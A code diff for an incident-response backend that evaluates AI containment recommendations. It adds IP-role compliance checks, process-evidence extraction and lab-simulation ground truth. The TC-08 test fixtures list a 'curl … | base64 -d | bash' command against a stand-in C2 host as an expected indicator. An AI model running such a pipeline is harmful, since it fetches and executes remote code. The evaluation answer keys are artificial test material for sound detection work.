@@ -1,0 +1,374 @@
+diff --git a/apps/backend/scripts/eval/extended/order-experiment.ts b/apps/backend/scripts/eval/extended/order-experiment.ts
+index 5ab59a8..febac35 100644
+--- a/apps/backend/scripts/eval/extended/order-experiment.ts
++++ b/apps/backend/scripts/eval/extended/order-experiment.ts
+@@ -64,7 +64,7 @@ function reverseIps(ctx: any) {
+       out.push({ incidentId, srcip: a.s, dstip: a.d, variant: name, targetsListInContext: firstTarget(ctx), picks, correct: picks.filter((p) => p.role.startsWith("destination")).length, of: picks.length });
+     }
+   }
+-  const f = path.join(__dirname, "..", "..", "..", "..", "..", "results", "extended-evaluation", "data", "order-experiment.json");
++  const f = process.env.ORDER_EXPERIMENT_OUT ?? path.join(__dirname, "..", "..", "..", "..", "..", "results", "extended-evaluation", "data", "order-experiment.json"); // override so a rerun never overwrites the frozen file
+   fs.mkdirSync(path.dirname(f), { recursive: true });
+   fs.writeFileSync(f, JSON.stringify({ at: new Date().toISOString(), note: "diagnostic: only the order of IP candidates in the context differs between variants", results: out }, null, 2));
+   console.log("wrote", f);
+diff --git a/apps/backend/scripts/eval/run-real-evaluation.ts b/apps/backend/scripts/eval/run-real-evaluation.ts
+index 63c855d..758700c 100644
+--- a/apps/backend/scripts/eval/run-real-evaluation.ts
++++ b/apps/backend/scripts/eval/run-real-evaluation.ts
+@@ -22,6 +22,7 @@ import { PrismaClient } from "@prisma/client";
+ import { REAL_GROUND_TRUTH, RealTcGroundTruth, resolveGroundTruth } from "../../src/evaluation/groundTruthReal";
+ import { collectEvaluationCase, knownActionCodes, verificationModeOf } from "../../src/evaluation/EvaluationService";
+ import { EvaluationCase } from "../../src/evaluation/types";
++import { isExpectedIocPresent } from "../../src/evaluation/iocRecall";
+ import { probeWazuhManagerApi, wazuhManagerConfigFromEnv } from "../../src/infrastructure/external-services/siem/WazuhManagerHealth";
+ import { ManualDecisionUseCase } from "../../src/application/approval/use-cases/ManualDecision.usecase";
+ import { AuditLogger } from "../../src/infrastructure/database/postgres/repositories/AuditLogger";
+@@ -218,7 +219,7 @@ async function runCase(prisma: PrismaClient, ctx: ReturnType<typeof buildEvalCon
+   }
+   if (analysis?.isFailure) obs(`AI_ANALYSIS_FAILED: ${JSON.stringify(analysis.error).slice(0, 200)}`);
+   const ioc0 = await prisma.threatIntelIoc.findMany({ where: { incidentId }, select: { iocType: true, iocValue: true, createdBy: true } });
+-  const missing = gt.expectedIocs.filter((e) => !ioc0.some((i) => e.value.toLowerCase().split("|").includes(i.iocValue.toLowerCase()))).map((e) => `${e.type}:${e.value}`);
++  const missing = gt.expectedIocs.filter((e) => !isExpectedIocPresent(e, ioc0)).map((e) => `${e.type}:${e.value}`);
+   base.iocRecall = { expected: gt.expectedIocs.length, found: gt.expectedIocs.length - missing.length, missing };
+   if (missing.length) obs(`EXPECTED_IOC_MISSING (before any correction): ${missing.join(", ")}`);
+ 
+diff --git a/apps/backend/scripts/eval/simulations.ts b/apps/backend/scripts/eval/simulations.ts
+index 57fbb6a..5115615 100644
+--- a/apps/backend/scripts/eval/simulations.ts
++++ b/apps/backend/scripts/eval/simulations.ts
+@@ -45,7 +45,7 @@ export interface SimResult {
+ 
+ /** Facts known BEFORE any attack (used to resolve ground-truth placeholders). */
+ export function environmentFacts(): Record<string, string> {
+-  return { ATTACKER_IP: containerIp(ATTACKER), ENDPOINT_IP: containerIp(ENDPOINT), TESTSERVER_IP: containerIp(TESTSERVER), ATTEMPTED_USER: ["admin", "oracle", "test", "git", "postgres", "ubuntu", "deploy", "backup", "user1", "support"].join("|") };
++  return { ATTACKER_IP: containerIp(ATTACKER), ENDPOINT_IP: containerIp(ENDPOINT), TESTSERVER_IP: containerIp(TESTSERVER), KWORKERD_SHA256: sh(ENDPOINT, "sha256sum /bin/sleep | cut -d' ' -f1").trim(), ATTEMPTED_USER: ["admin", "oracle", "test", "git", "postgres", "ubuntu", "deploy", "backup", "user1", "support"].join("|") };
+ }
+ 
+ /** Idempotent lab preparation. Also removes artifacts of earlier runs so every case starts from a known state. */
+@@ -150,14 +150,22 @@ export async function simulate(caseId: string, f: Record<string, string>): Promi
+       const ps = sh(ENDPOINT, `test -d /proc/${pid} || { echo DEAD; exit 0; }; echo "$(tr '\\0' ' ' < /proc/${pid}/cmdline | cut -d' ' -f1)|$(ps -o ppid= -p ${pid} | tr -d ' ')|$(ps -o user= -p ${pid})|$(id -u www-data)"`).trim();
+       if (ps === "DEAD" || ps.split("|").some((x) => !x)) throw new Error(`TC-08: simulated process ${pid} is not alive; refusing to fabricate process telemetry (${ps})`);
+       const [exe, ppid, user, uid] = ps.split("|");
++      // Attributes the real process has, read from the endpoint (nothing invented): sha256 of the real dropped file and the
++      // parent process name. The sha256 must equal the pre-attack fact KWORKERD_SHA256 (the file is a copy of /bin/sleep).
++      const sha256 = sh(ENDPOINT, "sha256sum /tmp/.cache/kworkerd | cut -d' ' -f1").trim();
++      const parent = sh(ENDPOINT, `ps -o comm= -p ${ppid} | tr -d ' '`).trim();
++      if (!/^[a-f0-9]{64}$/.test(sha256)) throw new Error(`TC-08: could not read the sha256 of the real dropped file (${sha256})`);
++      if (sha256 !== f.KWORKERD_SHA256) throw new Error(`TC-08: sha256 of /tmp/.cache/kworkerd (${sha256}) differs from the pre-attack fact (${f.KWORKERD_SHA256})`);
+       // (exe comes from /proc/PID/cmdline: readlink /proc/PID/exe needs CAP_SYS_PTRACE, absent in the container)
+       // auditd-style layout (data.audit.*): Wazuh's index template maps data.process as an OBJECT, so a scalar
+       // `process` field is rejected by the indexer (mapper_parsing_exception) � found in the Clean Run.
+       appendTelemetry({
+-        vigix: { event_type: "suspicious_process" }, audit: { exe, command: cmdline, ppid: Number(ppid), uid, pid: Number(pid) }, agent_host: ENDPOINT_AGENT,
+-        message: `process ${exe} (pid ${pid}, ppid ${ppid}, user ${user}) running from a world-writable path; parent shell command: ${cmdline}`,
++        vigix: { event_type: "suspicious_process" }, audit: { exe, command: cmdline, ppid: Number(ppid), parent, uid, user, pid: Number(pid) },
++        // same values again in the scalar fields the IOC extractor reads (data.command / data.file / data.sha256)
++        command: cmdline, file: exe, sha256, agent_host: ENDPOINT_AGENT,
++        message: `process ${exe} (pid ${pid}, ppid ${ppid} ${parent}, user ${user}, sha256 ${sha256}) running from a world-writable path; parent shell command: ${cmdline}`,
+       });
+-      facts.pid = pid; facts.exe = exe; facts.user = user;
++      facts.pid = pid; facts.exe = exe; facts.user = user; facts.sha256 = sha256; facts.parentProcess = parent; facts.commandLine = cmdline;
+       notes.push("Process is real (sleep renamed kworkerd, alive when inspected); the telemetry line is generated by the harness from /proc, in the auditd data.audit.* layout.");
+       break;
+     }
+diff --git a/apps/backend/src/application/recommendation/dto/RecommendationContextDto.ts b/apps/backend/src/application/recommendation/dto/RecommendationContextDto.ts
+index 0a5ce3d..d2c2c31 100644
+--- a/apps/backend/src/application/recommendation/dto/RecommendationContextDto.ts
++++ b/apps/backend/src/application/recommendation/dto/RecommendationContextDto.ts
+@@ -16,6 +16,8 @@ export interface RecommendationContextIoc {
+   manual?: boolean;
+   /** Stable citation id ("I1", "I2", ...) assigned by RecommendationContextBuilder; the AI cites this, not the value. */
+   ref?: string;
++  /** IP role in the triggering alert (source = data.srcip, destination = data.dstip); absent for non-IP / unknown. */
++  networkRole?: "source" | "destination";
+ }
+ 
+ export interface RecommendationContextMitreMapping {
+diff --git a/apps/backend/src/application/recommendation/ports/IRecommendationContextRepository.ts b/apps/backend/src/application/recommendation/ports/IRecommendationContextRepository.ts
+index 77648af..f6906b3 100644
+--- a/apps/backend/src/application/recommendation/ports/IRecommendationContextRepository.ts
++++ b/apps/backend/src/application/recommendation/ports/IRecommendationContextRepository.ts
+@@ -25,6 +25,8 @@ export interface IocContextRow {
+   sourceAlertId?: string | null;
+   sourceExternalAlertId?: string | null;
+   addedReason?: string | null;
++  /** Role of an IP IOC in the alert that raised the incident (data.srcip -> source, data.dstip -> destination). */
++  networkRole?: "source" | "destination";
+ }
+ 
+ export interface MitreMappingContextRow {
+diff --git a/apps/backend/src/application/recommendation/services/RecommendationContextBuilder.ts b/apps/backend/src/application/recommendation/services/RecommendationContextBuilder.ts
+index 8892722..4096dcb 100644
+--- a/apps/backend/src/application/recommendation/services/RecommendationContextBuilder.ts
++++ b/apps/backend/src/application/recommendation/services/RecommendationContextBuilder.ts
+@@ -111,6 +111,7 @@ export class RecommendationContextBuilder {
+         reputationScore: i.reputationScore,
+         manual: i.manual ?? false,
+         ref: `I${n + 1}`,
++        ...(i.networkRole ? { networkRole: i.networkRole } : {}),
+       })),
+       mitreMappings: mitreMappings.map((m) => ({
+         techniqueId: m.techniqueId,
+diff --git a/apps/backend/src/domain/investigation/alertIocs.ts b/apps/backend/src/domain/investigation/alertIocs.ts
+index 7d2c19b..7f04696 100644
+--- a/apps/backend/src/domain/investigation/alertIocs.ts
++++ b/apps/backend/src/domain/investigation/alertIocs.ts
+@@ -30,6 +30,7 @@ export function extractAlertIocs(rawPayload: unknown): AlertIoc[] {
+   const payload = asObject(rawPayload) ?? {};
+   const data = asObject(payload.data) ?? {};
+   const win = asObject(asObject(data.win)?.eventdata) ?? {};
++  const audit = asObject(data.audit) ?? {};
+   const out: AlertIoc[] = [];
+   const add = (iocType: IocType | null, raw: unknown, path: string) => {
+     const value = str(raw);
+@@ -67,6 +68,9 @@ export function extractAlertIocs(rawPayload: unknown): AlertIoc[] {
+   add("PROCESS_NAME", win.image, "data.win.eventdata.image");
+   add("PROCESS_NAME", win.parentImage, "data.win.eventdata.parentImage");
+   add("PROCESS_NAME", data.process, "data.process");
++  // auditd-style layout: the executable of the audited process. A scalar data.process cannot be indexed by Wazuh (the
++  // index template maps data.process as an object), so process alerts from the Wazuh Indexer carry it here.
++  add("PROCESS_NAME", audit.exe, "data.audit.exe");
+   add("COMMAND_LINE", win.commandLine, "data.win.eventdata.commandLine");
+   add("COMMAND_LINE", data.command, "data.command");
+   add("REGISTRY_KEY", win.targetObject, "data.win.eventdata.targetObject");
+diff --git a/apps/backend/src/evaluation/EvaluationService.ts b/apps/backend/src/evaluation/EvaluationService.ts
+index f41eb91..3771ce2 100644
+--- a/apps/backend/src/evaluation/EvaluationService.ts
++++ b/apps/backend/src/evaluation/EvaluationService.ts
+@@ -31,6 +31,9 @@ export interface ComplianceInput {
+   policyByAction: Record<string, { approvalRequired: boolean; responsibleRole: string | null; approvalRole: string | null }>;
+   approvalRoleUsed: string | null;       // role of the approval actually created
+   approvalDecided: boolean;              // a human decision was recorded
++  /** Alert's data.srcip / data.dstip. When either is supplied, IP-blocking steps are role-checked (targetRole). */
++  alertSrcIp?: string | null;
++  alertDstIp?: string | null;
+ }
+ 
+ /** Deterministic Recommendation Compliance — six mandatory criteria; compliant = all six (§3). */
+@@ -64,8 +67,18 @@ export function evaluateCompliance(i: ComplianceInput): ComplianceChecks {
+     : true;
+   if (!approvalCorrectness) failed.push(`approvalCorrectness: approval role ${i.approvalRoleUsed ?? "none"} != Policy role ${expectedRole ?? "?"} (or no decision recorded)`);
+ 
+-  const compliant = attackAlignment && evidenceSupport && knowledgeValidity && policyCompliance && playbookAlignment && approvalCorrectness;
+-  return { attackAlignment, evidenceSupport, knowledgeValidity, policyCompliance, playbookAlignment, approvalCorrectness, compliant, failedChecks: failed };
++  // targetRole: BLOCK-SOURCE-IP must hit the alert's srcip, BLOCK-DESTINATION-IP its dstip (membership in evidence is not enough).
++  const roleChecked = i.alertSrcIp !== undefined || i.alertDstIp !== undefined;
++  const wrongRole = !roleChecked ? [] : steps.filter((s) => {
++    if (s.actionCode === "ACT-BLOCK-SOURCE-IP") return !i.alertSrcIp || s.target !== i.alertSrcIp;
++    if (s.actionCode === "ACT-BLOCK-DESTINATION-IP") return !i.alertDstIp || s.target !== i.alertDstIp;
++    return false;
++  });
++  const targetRole = wrongRole.length === 0;
++  if (!targetRole) failed.push(`targetRole: ${wrongRole.map((s) => `${s.actionCode}->${s.target} (alert src=${i.alertSrcIp ?? "?"}, dst=${i.alertDstIp ?? "?"})`).join("; ")} targets the wrong IP role`);
++
++  const compliant = attackAlignment && evidenceSupport && knowledgeValidity && policyCompliance && playbookAlignment && approvalCorrectness && targetRole;
++  return { attackAlignment, evidenceSupport, knowledgeValidity, policyCompliance, playbookAlignment, approvalCorrectness, targetRole, compliant, failedChecks: failed };
+ }
+ 
+ const secondsBetween = (a: Date | null | undefined, b: Date | null | undefined): number | null =>
+@@ -218,6 +231,8 @@ export async function collectEvaluationCase(prisma: PrismaClient, gt: TcGroundTr
+     policyByAction: policyResult,
+     approvalRoleUsed: approval?.approvalRole ?? null,
+     approvalDecided: base.workflow.decisionCompleted,
++    alertSrcIp: ((alert.rawPayload as any)?.data?.srcip as string | undefined) ?? null,
++    alertDstIp: ((alert.rawPayload as any)?.data?.dstip as string | undefined) ?? null,
+   });
+   base.compliance = compliance;
+   base.recommendationCompliance = compliance.compliant ? "COMPLIANT" : "NON_COMPLIANT";
+diff --git a/apps/backend/src/evaluation/groundTruth.ts b/apps/backend/src/evaluation/groundTruth.ts
+index 822fe05..4f6a014 100644
+--- a/apps/backend/src/evaluation/groundTruth.ts
++++ b/apps/backend/src/evaluation/groundTruth.ts
+@@ -82,7 +82,7 @@ export const TC_GROUND_TRUTH: TcGroundTruth[] = [
+   {
+     caseId: "TC-08", ruleId: "100330", attackName: "Suspicious Process", attackType: "SUSPICIOUS_PROCESS_EXECUTION",
+     expectedSeverity: "medium", expectedMitre: ["T1059.004"],
+-    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }],
++    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64" }],
+     allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
+     expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true,
+     knownFindings: ["Analyst manually added a COMMAND IOC so ACT-KILL-PROCESS met its COMMAND_LINE evidence requirement (INSUFFICIENT_EVIDENCE otherwise)."],
+diff --git a/apps/backend/src/evaluation/groundTruthReal.ts b/apps/backend/src/evaluation/groundTruthReal.ts
+index fd05564..16ae2dd 100644
+--- a/apps/backend/src/evaluation/groundTruthReal.ts
++++ b/apps/backend/src/evaluation/groundTruthReal.ts
+@@ -37,6 +37,10 @@ export interface RealTcGroundTruth extends TcGroundTruth {
+   expectedApproval: string;
+   expectedVerification: string;
+   environmentNote?: string;
++  /** Machine-checkable evidence the simulation emits (values or @placeholders resolved from pre-attack facts). A field is
++   *  null when the telemetry cannot honestly provide it; the reason is in evidenceLimits. Not derived from any AI output. */
++  expectedEvidence?: { host: string; processName: string; processPath: string; commandLine: string; parentProcess: string | null; user: string; fileSha256: string | null; timestamp: string };
++  evidenceLimits?: string[];
+ }
+ 
+ const APPROVAL = "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves";
+@@ -124,9 +128,15 @@ export const REAL_GROUND_TRUTH: RealTcGroundTruth[] = [
+     mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "Real process /tmp/.cache/kworkerd (renamed sleep) as www-data plus a harmless 'curl | base64 -d | bash' pipeline against the test server; process telemetry read from /proc",
+     expectedWazuh: { ruleId: "100330", level: 10, stockRule: false },
+     expectedSeverity: "medium", expectedMitre: ["T1059.004"],
+-    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash" }],
++    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "@KWORKERD_SHA256" }],
+     allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
+-    expectedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE"], expectedTargets: ["/tmp/.cache/kworkerd", "attack-endpoint"],
++    expectedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE"], expectedTargets: ["/tmp/.cache/kworkerd", "@KWORKERD_SHA256", "attack-endpoint"],
++    expectedEvidence: { host: "attack-endpoint", processName: "kworkerd", processPath: "/tmp/.cache/kworkerd", commandLine: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash", parentProcess: null, user: "www-data", fileSha256: "@KWORKERD_SHA256", timestamp: "event timestamp (alert.timestamp)" },
++    evidenceLimits: [
++      "parentProcess is null in the specification: the parent of the detached (setsid) process is read from the endpoint at run time (data.audit.parent) and recorded in the simulation facts, but its value is not fixed in advance.",
++      "commandLine is the parent shell pipeline; the process itself is 'sleep 40' renamed kworkerd (its own argv is not security-relevant).",
++      "Process name / PID are only in data.audit.* (data.process is object-mapped in the Wazuh index, so a scalar data.process cannot be indexed); the IOC extractor does not read data.audit.* (PSI-2), so ACT-KILL-PROCESS has no PROCESS_NAME target unless extraction is extended or an analyst adds it.",
++    ],
+     expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
+     knownFindings: [],
+     environmentNote: "ACT-KILL-PROCESS requires COMMAND_LINE evidence; a kill recommendation without a supported target/evidence must not appear.",
+@@ -164,5 +174,5 @@ export const realGroundTruthByCase = (caseId: string): RealTcGroundTruth | undef
+ /** Substitute "@NAME" placeholders with environment facts known BEFORE the attack (never AI output). */
+ export function resolveGroundTruth(gt: RealTcGroundTruth, ctx: Record<string, string>): RealTcGroundTruth {
+   const sub = (v: string) => (v.startsWith("@") ? ctx[v.slice(1)] ?? v : v);
+-  return { ...gt, expectedIocs: gt.expectedIocs.map((i) => ({ ...i, value: sub(i.value) })), expectedTargets: gt.expectedTargets.map(sub) };
++  return { ...gt, expectedIocs: gt.expectedIocs.map((i) => ({ ...i, value: sub(i.value) })), expectedTargets: gt.expectedTargets.map(sub), ...(gt.expectedEvidence ? { expectedEvidence: { ...gt.expectedEvidence, fileSha256: gt.expectedEvidence.fileSha256 ? sub(gt.expectedEvidence.fileSha256) : null } } : {}) };
+ }
+diff --git a/apps/backend/src/evaluation/types.ts b/apps/backend/src/evaluation/types.ts
+index cb8c065..4927b15 100644
+--- a/apps/backend/src/evaluation/types.ts
++++ b/apps/backend/src/evaluation/types.ts
+@@ -8,7 +8,8 @@ export interface ComplianceChecks {
+   policyCompliance: boolean;  // step.requiresApproval matches the Policy snapshot; responsible role present
+   playbookAlignment: boolean; // snapshot playbook == expected, and every action is in that playbook's allowed set
+   approvalCorrectness: boolean; // the created approval's role matches Policy when approval is required
+-  compliant: boolean;         // AND of the six mandatory criteria
++  targetRole: boolean;        // BLOCK-SOURCE-IP targets alert data.srcip, BLOCK-DESTINATION-IP targets data.dstip
++  compliant: boolean;         // AND of the six mandatory criteria + targetRole
+   failedChecks: string[];     // traceable reasons
+ }
+ 
+diff --git a/apps/backend/src/infrastructure/ai/RecommendationPromptBuilder.ts b/apps/backend/src/infrastructure/ai/RecommendationPromptBuilder.ts
+index f86e641..0f6e074 100644
+--- a/apps/backend/src/infrastructure/ai/RecommendationPromptBuilder.ts
++++ b/apps/backend/src/infrastructure/ai/RecommendationPromptBuilder.ts
+@@ -58,7 +58,7 @@ export class RecommendationPromptBuilder {
+       const note = linkedIocs.has(ioc.iocValue)
+         ? ioc.manual ? "added by an analyst" : "linked to evidence"
+         : "CONTEXT ONLY — not linked to any evidence (e.g. the reporting agent's own address); NEVER a target, never block it";
+-      lines.push(`  - [${ioc.ref}] type=${ioc.iocType} value=${ioc.iocValue} source=${ioc.source} reputationScore=${ioc.reputationScore ?? "unknown"} (${note})`);
++      lines.push(`  - [${ioc.ref}] type=${ioc.iocType} value=${ioc.iocValue} source=${ioc.source} reputationScore=${ioc.reputationScore ?? "unknown"}${ioc.networkRole ? ` role=${ioc.networkRole}` : ""} (${note})`);
+     }
+     lines.push("");
+ 
+@@ -86,7 +86,7 @@ export class RecommendationPromptBuilder {
+     lines.push("Targetable values (the ONLY allowed step targets):");
+     const targetable = context.iocs.filter((i) => linkedIocs.has(i.iocValue));
+     if (targetable.length === 0 && context.affectedHosts.length === 0) lines.push("  (none)");
+-    for (const i of targetable) lines.push(`  - ${JSON.stringify(i.iocValue)} (${i.iocType})`);
++    for (const i of targetable) lines.push(`  - ${JSON.stringify(i.iocValue)} (${i.iocType}${i.networkRole ? `, ${i.networkRole} IP of the alert` : ""})`);
+     for (const h of context.affectedHosts) lines.push(`  - ${JSON.stringify(h)} (affected host)`);
+     lines.push("");
+ 
+diff --git a/apps/backend/src/infrastructure/database/postgres/repositories/RecommendationContextRepository.prisma.ts b/apps/backend/src/infrastructure/database/postgres/repositories/RecommendationContextRepository.prisma.ts
+index d018c50..07e4d76 100644
+--- a/apps/backend/src/infrastructure/database/postgres/repositories/RecommendationContextRepository.prisma.ts
++++ b/apps/backend/src/infrastructure/database/postgres/repositories/RecommendationContextRepository.prisma.ts
+@@ -42,11 +42,18 @@ export class PrismaRecommendationContextRepository implements IRecommendationCon
+             },
+       include: { sourceAlert: { select: { externalAlertId: true } } },
+     });
++    // IP role comes from the triggering alert's own fields; an IP that is both (or neither) gets no role.
++    const alert = (await this.prisma.incident.findUnique({ where: { id: incidentId }, select: { alert: { select: { rawPayload: true } } } }))?.alert;
++    const data = ((alert?.rawPayload as any)?.data ?? {}) as Record<string, unknown>;
++    const src = typeof data.srcip === "string" ? data.srcip : null;
++    const dst = typeof data.dstip === "string" ? data.dstip : null;
++    const roleOf = (v: string): "source" | "destination" | undefined => (src !== dst ? (v === src ? "source" : v === dst ? "destination" : undefined) : undefined);
+     return rows.map((r) => ({
+       iocType: r.iocType,
+       iocValue: r.iocValue,
+       source: r.source,
+       reputationScore: r.reputationScore,
++      ...(r.iocType === "IPV4" || r.iocType === "IPV6" ? { networkRole: roleOf(r.iocValue) } : {}),
+       manual: !!r.createdBy && r.createdBy !== "system",
+       id: r.id,
+       createdBy: r.createdBy,
+diff --git a/apps/backend/src/infrastructure/recommendation-validation/RecommendationValidator.ts b/apps/backend/src/infrastructure/recommendation-validation/RecommendationValidator.ts
+index e292b2f..1e5ee80 100644
+--- a/apps/backend/src/infrastructure/recommendation-validation/RecommendationValidator.ts
++++ b/apps/backend/src/infrastructure/recommendation-validation/RecommendationValidator.ts
+@@ -170,9 +170,14 @@ export class RecommendationValidator {
+     // Only IOCs linked to this cycle's evidence or added by an analyst are actionable targets. An IOC the
+     // pipeline merely extracted (e.g. the victim agent's own IP) is context, not something to contain.
+     const targetable = targetableIocValues(context);
+-    const iocKindByValue = new Map<string, TargetKind>(
+-      context.iocs.filter((i) => targetable.has(i.iocValue)).map((i) => [i.iocValue, iocKind(i.iocType)])
+-    );
++    // One value can be several kinds at once (a binary's path is both a FILE_PATH and a PROCESS_NAME): keep every kind.
++    const iocKindsByValue = new Map<string, Set<TargetKind>>();
++    for (const i of context.iocs) {
++      if (!targetable.has(i.iocValue)) continue;
++      const kinds = iocKindsByValue.get(i.iocValue) ?? new Set<TargetKind>();
++      kinds.add(iocKind(i.iocType));
++      iocKindsByValue.set(i.iocValue, kinds);
++    }
+     const evidenceText = [
+       context.incidentTitle,
+       ...context.iocs.map((i) => i.iocValue),
+@@ -234,15 +239,16 @@ export class RecommendationValidator {
+       }
+ 
+       // ---- Target --------------------------------------------------------------------------------
+-      const targetKind: TargetKind | undefined = hosts.includes(step.target) ? "host" : iocKindByValue.get(step.target);
+-      if (!targetKind) {
++      const targetKinds: ReadonlySet<TargetKind> | undefined = hosts.includes(step.target) ? new Set<TargetKind>(["host"]) : iocKindsByValue.get(step.target);
++      const requiredKind = ACTION_TARGET_KIND[action.code];
++      if (!targetKinds) {
+         flag("INVENTED_TARGET", `${label}: target "${step.target}" is not an evidence-linked/analyst-added IOC or an affected host`);
+-      } else if (ACTION_TARGET_KIND[action.code] && ACTION_TARGET_KIND[action.code] !== targetKind) {
+-        flag("TARGET_TYPE_MISMATCH", `${label}: target "${step.target}" is a ${targetKind}, but ${action.code} operates on a ${ACTION_TARGET_KIND[action.code]}`);
++      } else if (requiredKind && !targetKinds.has(requiredKind)) {
++        flag("TARGET_TYPE_MISMATCH", `${label}: target "${step.target}" is a ${[...targetKinds].join("/")}, but ${action.code} operates on a ${requiredKind}`);
+       }
+       // Required evidence (Action knowledge + ACTION_COMPLIANCE policy). VALIDATED_IOC_TARGET is reported by the
+       // INVENTED_TARGET / TARGET_TYPE_MISMATCH checks above with a more precise message.
+-      if (targetKind) {
++      if (targetKinds) {
+         const compliance = procedure?.compliance;
+         const missing = missingEvidenceForTarget(context, action.code, step.target, compliance?.requiredEvidence ?? []).filter((r) => r !== "VALIDATED_IOC_TARGET");
+         if (missing.length) {
+@@ -285,7 +291,7 @@ export class RecommendationValidator {
+         flag("INVALID_INSTRUCTIONS", `${label}: instruction order must be 1..${instructions.length} without gaps or duplicates`);
+       }
+       for (const ins of instructions) {
+-        if (ins.target && ins.target !== step.target && !hosts.includes(ins.target) && !iocKindByValue.has(ins.target)) {
++        if (ins.target && ins.target !== step.target && !hosts.includes(ins.target) && !iocKindsByValue.has(ins.target)) {
+           flag("INVENTED_TARGET", `${label}: instruction ${ins.order} targets "${ins.target}", which is not an evidence-linked/analyst-added IOC or an affected host`);
+         }
+       }
+diff --git a/apps/backend/test/EvaluationCompliance.test.ts b/apps/backend/test/EvaluationCompliance.test.ts
+index 741285b..e1a273e 100644
+--- a/apps/backend/test/EvaluationCompliance.test.ts
++++ b/apps/backend/test/EvaluationCompliance.test.ts
+@@ -96,6 +96,27 @@ describe("Recommendation Compliance (deterministic)", () => {
+     const r = evaluateCompliance(i);
+     expect(r.compliant).toBe(false);
+   });
++
++  it("BLOCK-DESTINATION-IP aimed at the alert's source (endpoint) -> NON_COMPLIANT (targetRole)", () => {
++    // TC-07/TC-09: endpoint .5 is the SOURCE, lab server .7 the destination
++    const i = base();
++    i.steps = [{ actionCode: "ACT-BLOCK-DESTINATION-IP", target: "172.19.0.5", requiresApproval: true }];
++    i.allowedActions.push("ACT-BLOCK-DESTINATION-IP");
++    i.playbookAllowedActions.push("ACT-BLOCK-DESTINATION-IP");
++    i.policyByAction["ACT-BLOCK-DESTINATION-IP"] = { approvalRequired: true, responsibleRole: "IR_TEAM", approvalRole: "IR_TEAM" };
++    i.knownActionCodes.add("ACT-BLOCK-DESTINATION-IP");
++    i.targetableValues.add("172.19.0.5").add("172.19.0.7");
++    i.alertSrcIp = "172.19.0.5";
++    i.alertDstIp = "172.19.0.7";
++    const wrong = evaluateCompliance(i);
++    expect(wrong.evidenceSupport).toBe(true);
++    expect(wrong.targetRole).toBe(false);
++    expect(wrong.compliant).toBe(false);
++    i.steps[0].target = "172.19.0.7";
++    const right = evaluateCompliance(i);
++    expect(right.targetRole).toBe(true);
++    expect(right.compliant).toBe(true);
++  });
+ });
+ 
+ describe("KPI timing (real timestamps)", () => {
